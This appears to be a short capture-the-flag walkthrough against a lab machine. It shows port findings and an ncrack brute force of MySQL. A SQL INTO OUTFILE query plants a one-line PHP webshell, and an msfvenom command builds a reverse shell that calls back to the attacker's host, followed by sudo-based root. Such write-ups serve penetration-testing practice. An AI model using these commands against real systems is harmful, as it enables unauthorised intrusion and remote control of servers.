# Port Enumeration
there are three open ports: 22, 80, and 3306
# Initial Access
On the index.php page, we see `beavis` and `butthead`. we can add these two to our `users.txt` file

We can try brute forcing the MySQL service:
```
ncrack -U users.txt -P /usr/share/wordlists/rockyou.txt -vv -T 5 mysql://192.168.212.9:3306
```
We get a credential pair

`beavis:rocknroll`
```
mysql -u beavis -h 192.168.212.9 -P 3306 -p --ssl-verify-server-cert=off
```
We can read the credentials in the friends database

We can also read the index.php file from the website:
```
select load_file('/var/www/html/index.php');
```
There is reference to a new directory in this file. It turns out that we have write access to this directory, so we can use SQL to write a webshell to that directory
```
select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE '/var/www/html/M3t4LL1c@/webshell.php';
```
From here we can create a reverse shell binary to run on the target
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.212.4 LPORT=443 -f elf -o /tmp/reverse.elf
```
# Privilege Escalation
Once on the box, we can use some of the captured credentials to become the butthead user

The butthead user runs `sudo` with the `su` command:
```
sudo su
```
done!
